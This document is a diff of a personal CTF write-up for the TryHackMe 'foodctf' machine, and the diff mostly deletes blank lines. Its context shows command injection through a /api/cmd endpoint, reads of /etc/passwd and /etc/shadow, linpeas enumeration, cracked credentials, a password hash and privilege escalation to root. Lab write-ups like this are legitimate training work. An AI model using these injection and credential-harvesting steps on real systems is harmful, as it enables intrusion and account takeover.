@@ -226,7 +226,6 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 105.20 seconds
 
-
 http://10.10.241.181:15065/
 
 Site down for maintenance
@@ -294,7 +293,6 @@ http://10.10.241.181:15065/api/cmd
 
 ping -c 4 10.8.19.103
 
-
 ┌──(witty㉿kali)-[~/bug_hunter]
 └─$ curl http://10.10.241.181:15065/api/cmd -X POST -d "ls -lah"
 total 7.8M
@@ -359,7 +357,6 @@ bread:x:1004:1004:,,,:/home/bread:/bin/bash
 └─$ curl http://10.10.241.181:15065/api/cmd -X POST -d "cat /etc/shadow"
 ERROR:	exit status 1  
 
-
 revshell
 
 ┌──(witty㉿kali)-[~/bug_hunter]
@@ -400,7 +397,6 @@ chmod +x linpeas.sh
 bread@foodctf:/tmp$ ./linpeas.sh
 
 ./linpeas.sh
-
 
                             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                     ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
@@ -462,8 +458,6 @@ Writable folder: /dev/shm
 [+] /bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
 [+] /bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
 
-
-
 Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
 uniq: write error: Broken pipe
 DONE
@@ -487,8 +481,6 @@ Sudo version 1.8.21p2
 Vulnerable to CVE-2021-4034
 
 Potentially Vulnerable to CVE-2022-2588
-
-
 
 ╔══════════╣ PATH
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
@@ -622,7 +614,6 @@ https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
    Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip
    Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.
 
-
 ╔══════════╣ Executing Linux Exploit Suggester 2
 ╚ https://github.com/jondonas/linux-exploit-suggester-2
 
@@ -650,7 +641,6 @@ apparmor module is loaded.
 ╔══════════╣ Container details
 ═╣ Is this a container? ........... No
 ═╣ Any running containers? ........ No
-
 
                                      ╔═══════╗
 ═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
@@ -688,13 +678,9 @@ PrivateIPv6s:
 Subnet IPv6: 
 Public IPv4s:
 
-
-
 ══╣ IAM Role
 
-
 ══╣ User Data
-
 
                 ╔════════════════════════════════════════════════╗
 ════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
@@ -956,7 +942,6 @@ org.freedesktop.systemd1               1 systemd         root             :1.2  
 org.freedesktop.thermald               - -               -                (activatable) -                         -         
 org.freedesktop.timedate1              - -               -                (activatable) -                         -         
 
-
                               ╔═════════════════════╗
 ══════════════════════════════╣ Network Information ╠══════════════════════════════
                               ╚═════════════════════╝
@@ -996,7 +981,6 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
         TX packets 180  bytes 16060 (16.0 KB)
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 
-
 ╔══════════╣ Active Ports
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
 tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
@@ -1010,8 +994,6 @@ tcp6       0      0 :::15065                :::*                    LISTEN      
 
 ╔══════════╣ Can I sniff with tcpdump?
 No
-
-
 
                                ╔═══════════════════╗
 ═══════════════════════════════╣ Users Information ╠═══════════════════════════════
@@ -1118,8 +1100,6 @@ bread            pts/0    10.8.6.110       Mon Apr  6 20:15:37 +0000 2020
 
 ╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
 
-
-
                              ╔══════════════════════╗
 ═════════════════════════════╣ Software Information ╠═════════════════════════════
                              ╚══════════════════════╝
@@ -1148,7 +1128,6 @@ ii  gcc-7                                 7.5.0-3ubuntu1~18.04                  
 
 ╔══════════╣ MySQL version
 mysql  Ver 14.14 Distrib 5.7.29, for Linux (x86_64) using  EditLine wrapper
-
 
 ═╣ MySQL connection using default root/root ........... Yes
 User	Host	authentication_string
@@ -1189,11 +1168,9 @@ Found readable /etc/mysql/my.cnf
 	refuse options = checksum dry-run
 	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz
 
-
 ╔══════════╣ Analyzing Ldap Files (limit 70)
 The password hash is from the {SSHA} to 'structural'
 drwxr-xr-x 2 root root 4096 Mar 20  2020 /etc/ldap
-
 
 ╔══════════╣ Searching ssl/ssh files
 ChallengeResponseAuthentication no
@@ -1234,7 +1211,6 @@ Subsystem	sftp	/usr/lib/openssh/sftp-server
 ══╣ /etc/hosts.allow file found, trying to read the rules:
 /etc/hosts.allow
 
-
 Searching inside /etc/ssh/ssh_config for interesting info
 Host *
     SendEnv LANG LC_*
@@ -1245,13 +1221,9 @@ Host *
 drwxr-xr-x 2 root root 4096 Mar 20  2020 /etc/pam.d
 -rw-r--r-- 1 root root 2133 Mar  4  2019 /etc/pam.d/sshd
 
-
-
-
 ╔══════════╣ Searching tmux sessions
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
 tmux 2.6
-
 
 /tmp/tmux-1004
 ╔══════════╣ Analyzing Cloud Init Files (limit 70)
@@ -1266,9 +1238,6 @@ tmux 2.6
 drwxr-xr-x 2 root root 121 Jun 21  2019 /snap/core/7270/usr/share/keyrings
 drwxr-xr-x 2 root root 121 Feb 12  2020 /snap/core/8689/usr/share/keyrings
 drwxr-xr-x 2 root root 4096 Aug  5  2019 /usr/share/keyrings
-
-
-
 
 ╔══════════╣ Searching uncommon passwd files (splunk)
 passwd file: /etc/pam.d/passwd
@@ -1321,7 +1290,6 @@ drwx------ 3 tryhackme tryhackme 4096 Mar 19  2020 /home/tryhackme/.gnupg
 
 -rw------- 1 root root 582 Mar 20  2020 /home/tryhackme/.viminfo
 
-
 ╔══════════╣ Analyzing Postfix Files (limit 70)
 -rw-r--r-- 1 root root 694 May 18  2016 /snap/core/7270/usr/share/bash-completion/completions/postfix
 
@@ -1329,65 +1297,15 @@ drwx------ 3 tryhackme tryhackme 4096 Mar 19  2020 /home/tryhackme/.gnupg
 
 -rw-r--r-- 1 root root 675 Apr  2  2018 /usr/share/bash-completion/completions/postfix
 
-
 ╔══════════╣ Analyzing Bind Files (limit 70)
 -rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind
 -rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind
 
-
-
 ╔══════════╣ Analyzing Windows Files (limit 70)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 lrwxrwxrwx 1 root root 20 Mar 19  2020 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
 lrwxrwxrwx 1 root root 24 Mar 19  2020 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
 -rw-r--r-- 1 root root 81 Mar 19  2020 /var/lib/dpkg/alternatives/my.cnf
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 ╔══════════╣ Analyzing Other Interesting Files (limit 70)
 -rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc
@@ -1399,10 +1317,6 @@ lrwxrwxrwx 1 root root 24 Mar 19  2020 /etc/mysql/my.cnf -> /etc/alternatives/my
 -rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/7270/etc/skel/.bashrc
 -rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/8689/etc/skel/.bashrc
 
-
-
-
-
 -rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
 -rw-r--r-- 1 bread bread 825 Mar 28  2020 /home/bread/.profile
 -rw-r--r-- 1 food food 815 Mar 28  2020 /home/food/.profile
@@ -1412,11 +1326,7 @@ lrwxrwxrwx 1 root root 24 Mar 19  2020 /etc/mysql/my.cnf -> /etc/alternatives/my
 -rw-r--r-- 1 root root 655 May  9  2019 /snap/core/7270/etc/skel/.profile
 -rw-r--r-- 1 root root 655 Jul 12  2019 /snap/core/8689/etc/skel/.profile
 
-
-
 -rw-r--r-- 1 tryhackme tryhackme 0 Mar 19  2020 /home/tryhackme/.sudo_as_admin_successful
-
-
 
                                ╔═══════════════════╗
 ═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════
@@ -1735,7 +1645,6 @@ Found /snap/core/7270/lib/firmware/regulatory.db: CRDA wireless regulatory datab
 Found /snap/core/8689/lib/firmware/regulatory.db: CRDA wireless regulatory database file
 Found /var/lib/mlocate/mlocate.db: regular file, no read permission
 
-
 ╔══════════╣ Web files?(output limit)
 
 ╔══════════╣ All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
@@ -1919,13 +1828,10 @@ Unpacking base-passwd (3.5.44) ...
 Unpacking base-passwd (3.5.44) over (3.5.44) ...
 Unpacking passwd (1:4.5-1ubuntu1) ...
 
-
-
                                 ╔════════════════╗
 ════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                 ╚════════════════╝
 Regexes to search for API keys aren't activated, use param '-r' 
-
 
 Found ╔══════════╣ CVEs Check
 Vulnerable to CVE-2021-4034 and ═╣ MySQL connection using default root/root ........... Yes
@@ -2003,12 +1909,10 @@ Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
   Memory usage: 55%               IP address for eth0: 10.10.241.181
   Swap usage:   0%
 
-
 0 packages can be updated.
 0 updates are security updates.
 
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
 
 Last login: Sat Feb 18 16:47:54 2023 from 10.8.19.103
 ramen@foodctf:~$ sudo -l
@@ -2076,7 +1980,6 @@ wrote extracted data to "creds.txt".
 └─$ cat creds.txt 
 pasta:pastaisdynamic
 
-
 ramen@foodctf:~$ su pasta
 Password: 
 pasta@foodctf:/home/ramen$ cd /home/pasta
@@ -2124,12 +2027,10 @@ Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
   Memory usage: 56%               IP address for eth0: 10.10.241.181
   Swap usage:   0%
 
-
 0 packages can be updated.
 0 updates are security updates.
 
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
 
 food@foodctf:~$ whoami
 -bash: whoami: No such file or directory
@@ -2146,7 +2047,6 @@ food@foodctf:/home$ ls
 -bash: ls: No such file or directory
 
 uhmm
-
 
 pasta@foodctf:/tmp$ su food
 Password: 
@@ -2341,7 +2241,6 @@ No Sockets found in /tmp/screens/S-food.
 # whoami
 root
 
-
 after executing koth 😂
 
 # ␊│␋├
@@ -2368,12 +2267,10 @@ Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
   Memory usage: 56%               IP address for eth0: 10.10.241.181
   Swap usage:   0%
 
-
 0 packages can be updated.
 0 updates are security updates.
 
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
 
 Last login: Sat Feb 18 17:17:45 2023 from ip-10-8-19-103.eu-west-1.compute.internal
 food@foodctf:~$ cd /tmp
@@ -2401,12 +2298,10 @@ Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)
   Memory usage: 55%               IP address for eth0: 10.10.241.181
   Swap usage:   0%
 
-
 0 packages can be updated.
 0 updates are security updates.
 
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
 
 Last login: Sat Feb 18 16:52:54 2023 from 10.8.19.103
 ramen@foodctf:~$ cd /tmp
@@ -2508,7 +2403,6 @@ another way
 $6$4N51xm8z..uzai6B$.VS3n7wI//OXXVv0lpYSyUFraoon/RSXD757ZBJgmddcUtAodLPPIokq8dcdpNmFroR78P6pKW7ZMzZT7vpRq1
 
 vim /etc/passwd
-
 
 dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
 landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
@@ -2613,14 +2507,8 @@ root
 
 ```
 
-![[Pasted image 20230218111735.png]]
-
-![[Pasted image 20230218115725.png]]
-
 Get all 8 flags.
 
  Completed
-
-
 
 [[Android Malware Analysis]]
